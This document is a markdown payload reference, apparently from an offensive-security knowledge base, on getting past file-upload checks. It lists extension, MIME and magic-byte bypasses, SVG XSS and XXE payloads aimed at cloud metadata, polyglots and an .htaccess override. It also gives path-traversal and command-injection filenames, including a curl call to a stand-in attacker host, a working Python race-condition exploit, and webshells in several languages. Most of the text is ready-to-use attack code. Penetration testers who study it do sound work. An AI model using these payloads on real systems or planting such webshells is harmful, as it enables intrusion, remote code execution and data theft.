---
id: "file-upload-bypass-payloads"
title: "File Upload Bypass Payloads & Techniques"
type: "payload"
category: "web-application"
subcategory: "file-upload"
tags: ["file-upload", "bypass", "webshell", "payload", "rce"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["vulnerability-priority-matrix", "attack-workflow-chains"]
updated: "2026-04-04"
---

## Overview

File upload bypass techniques to achieve remote code execution, XSS, or server-side file read. Targets any application that accepts user file uploads — profile pictures, document imports, attachment fields, etc.

## Payloads

### Extension Bypass — Case Manipulation

Bypass extension blacklists via case variation

- **Contexts**: file-upload
- **Severity**: critical

```
# PHP
shell.pHp
shell.Php
shell.PHP
shell.pHP
shell.phP

# ASP/ASPX
shell.aSp
shell.aSpx
shell.ASP
shell.ASPX

# JSP
shell.jSp
shell.JSP
shell.Jsp
```

### Extension Bypass — Double Extensions

Use double extensions to bypass filters

- **Contexts**: file-upload
- **Severity**: critical

```
shell.php.jpg
shell.php.png
shell.php.gif
shell.asp.jpg
shell.jsp.png
shell.php.txt
shell.php.pdf
shell.php5.jpg
```

### Extension Bypass — Alternative Extensions

Use lesser-known but executable extensions

- **Contexts**: file-upload
- **Severity**: critical

```
# PHP alternatives
shell.php3
shell.php4
shell.php5
shell.php7
shell.pht
shell.phtm
shell.phtml
shell.phps
shell.pgif
shell.shtml
shell.inc

# ASP alternatives
shell.asp
shell.aspx
shell.cer
shell.asa
shell.ashx
shell.asmx
shell.ascx

# JSP alternatives
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf

# Perl/CGI
shell.pl
shell.cgi

# Python
shell.py
```

### Extension Bypass — Null Byte

Null byte injection to truncate extension validation

- **Contexts**: file-upload
- **Severity**: critical

```
shell.php%00.jpg
shell.php%00.png
shell.php\x00.jpg
shell.asp%00.jpg
```

### Extension Bypass — Special Characters

Use special characters to confuse parsers

- **Contexts**: file-upload
- **Severity**: high

```
shell.php%0a
shell.php%0d%0a
shell.php/
shell.php.\
shell.php;.jpg
shell.php:jpg     # NTFS Alternate Data Stream
shell.php::$DATA  # NTFS ADS
shell.php%20      # Trailing space
shell.php.        # Trailing dot
shell.php....     # Multiple trailing dots
shell.php%00%00   # Multiple null bytes
```

### Content-Type Bypass

Change Content-Type header to bypass MIME validation

- **Contexts**: file-upload
- **Severity**: high

```
# Upload PHP file with image Content-Type
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream

# In multipart form data
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<PHP shell content>
```

### Magic Bytes / File Signature Bypass

Prepend valid file signatures to bypass magic byte validation

- **Contexts**: file-upload
- **Severity**: critical

```
# GIF header + PHP shell
GIF89a;
<?php system($_GET['c']); ?>

# JPEG header + PHP shell (hex)
\xFF\xD8\xFF\xE0<?php system($_GET['c']); ?>

# PNG header + PHP shell (hex)
\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>

# PDF header + PHP shell
%PDF-1.4
<?php system($_GET['c']); ?>
```

### SVG XSS Upload

Upload SVG files containing JavaScript for stored XSS

- **Contexts**: file-upload, xss
- **Severity**: high

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100" style="fill:red"/>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <img src=x onerror="alert(1)"/>
    </body>
  </foreignObject>
</svg>
```

### SVG SSRF Upload

Upload SVG to trigger server-side requests

- **Contexts**: file-upload, ssrf
- **Severity**: high

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="20">&xxe;</text>
</svg>
```

### Polyglot Files

Files that are valid in multiple formats simultaneously

- **Contexts**: file-upload
- **Severity**: critical

```
# GIFAR (GIF + PHP)
GIF89a;
<?php
system($_GET['c']);
?>

# PDFXSS (PDF with JavaScript)
%PDF-1.4
1 0 obj<</Pages 2 0 R>>endobj
2 0 obj<</Kids[3 0 R]/Count 1>>endobj
3 0 obj<</AA<</O<</S/JavaScript/JS(app.alert(1))>>>>
/MediaBox[0 0 612 792]>>endobj
trailer<</Root 1 0 R>>

# .htaccess upload (Apache — make .jpg files execute as PHP)
AddType application/x-httpd-php .jpg
```

### Filename Injection

Exploit filename handling for path traversal or command injection

- **Contexts**: file-upload
- **Severity**: high

```
# Path traversal in filename
../../../etc/cron.d/shell
..%2f..%2f..%2fetc/cron.d/shell
....//....//....//var/www/html/shell.php

# Command injection in filename (if filename is used in system commands)
; sleep 10;.jpg
$(sleep 10).jpg
`sleep 10`.jpg
| curl attacker.com.jpg

# Overwrite critical files
.htaccess
web.config
../../app/config/database.php
```

### Race Condition Upload

Upload file and access it before server-side validation/deletion

- **Contexts**: file-upload
- **Severity**: high

```python
# Race condition: upload shell, access it before antivirus/validation removes it
import requests
import threading

url_upload = "https://target.com/upload"
url_shell = "https://target.com/uploads/shell.php"

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
    requests.post(url_upload, files=files)

def access():
    for _ in range(100):
        r = requests.get(url_shell, params={'c': 'id'})
        if r.status_code == 200 and 'uid=' in r.text:
            print(f"[+] RCE: {r.text}")
            return

# Launch concurrently
for _ in range(50):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

### Webshell Payloads

Minimal webshells for various languages

- **Contexts**: file-upload, rce
- **Severity**: critical

```php
# PHP — one-liner
<?php system($_GET['c']); ?>

# PHP — eval
<?=`$_GET[c]`?>

# PHP — obfuscated (bypass basic WAF)
<?php $a='sys'.'tem'; $a($_GET['c']); ?>

# ASP
<% eval request("c") %>

# ASPX
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["c"]); %>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("c")); %>

# Python (CGI)
#!/usr/bin/env python3
import os; os.system(os.environ.get('QUERY_STRING',''))
```

## Detection Checklist

```
1. Identify all upload endpoints:
   □ Profile picture / avatar
   □ Document upload (resume, invoice, report)
   □ Import functionality (CSV, XML, JSON)
   □ Attachment fields (support tickets, comments)
   □ CMS media library

2. Test validation mechanisms:
   □ Extension blacklist → try alternative extensions
   □ Extension whitelist → try double extensions, null byte
   □ Content-Type check → modify MIME type in request
   □ Magic byte check → prepend valid file signature
   □ File size check → minimal payloads
   □ Image dimension check → polyglot with valid dimensions

3. Test upload destination:
   □ Can you access the uploaded file directly?
   □ Is the file renamed? (check for predictable naming)
   □ Is the file stored in web root?
   □ Is the file processed server-side? (image resize → ImageMagick exploit)

4. Escalate:
   □ Upload webshell → RCE
   □ Upload SVG → stored XSS
   □ Upload SVG/XML → SSRF/XXE
   □ Upload .htaccess → change server configuration
   □ Path traversal in filename → overwrite critical files
```
